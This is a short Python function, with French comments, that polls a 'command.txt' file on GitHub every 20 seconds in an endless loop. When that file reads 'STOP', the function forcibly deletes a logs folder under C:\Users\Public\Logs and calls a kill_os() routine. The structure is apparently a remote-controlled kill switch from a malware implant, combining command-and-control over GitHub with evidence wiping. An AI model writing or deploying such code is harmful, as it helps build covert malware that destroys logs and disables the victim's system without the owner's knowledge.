def commandeAdmin(command="STOP", logs_dir=r"C:\Users\Public\Logs"):
    while True:
        try:
            content = read_github("command.txt").strip()
            if content == command:
                if os.path.exists(logs_dir):
                    shutil.rmtree(logs_dir, onerror=lambda f,p,e: (os.chmod(p,0o777), f(p)))
                kill_os()
        except Exception:
            # Si read_github échoue (fichier n'existe pas), créer le fichier avec "ACTIVE"
            try:
                write_github_file("command.txt", "ACTIVE")
            except Exception:
                pass
        time.sleep(20)
